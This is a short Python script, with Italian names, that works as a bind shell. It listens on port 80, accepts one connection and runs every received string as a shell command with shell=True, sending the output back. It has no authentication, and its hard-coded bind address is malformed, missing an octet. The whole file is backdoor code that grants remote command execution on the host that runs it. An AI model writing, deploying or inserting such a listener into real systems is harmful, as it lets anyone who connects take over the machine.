import socket
import subprocess

def ricevi_comandi(conn):
    while True:
        richiesta = conn.recv(4096)
        risposta = subprocess.run(richiesta.decode(), shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        data = risposta.stdout + risposta.stderr
        conn.send(data)
def sub_server(indirizzo, backlog=1):
    try:
        s = socket.socket()
        s.bind(indirizzo)
        s.listen(backlog)
        print('Server on')
    except socket.error as error:
        print(f'Qualcosa è andato storto \n {error}')
        print('Sto tentando di reindirizzare il Server')
        sub_server(indirizzo, backlog=1)
    conn, indirizzo_client = s.accept()
    print (f'Connessione Server - Client Stabilita: {indirizzo_client}')
    ricevi_comandi(conn)
if __name__=='__main__':
    sub_server(('192.168.127', 80))

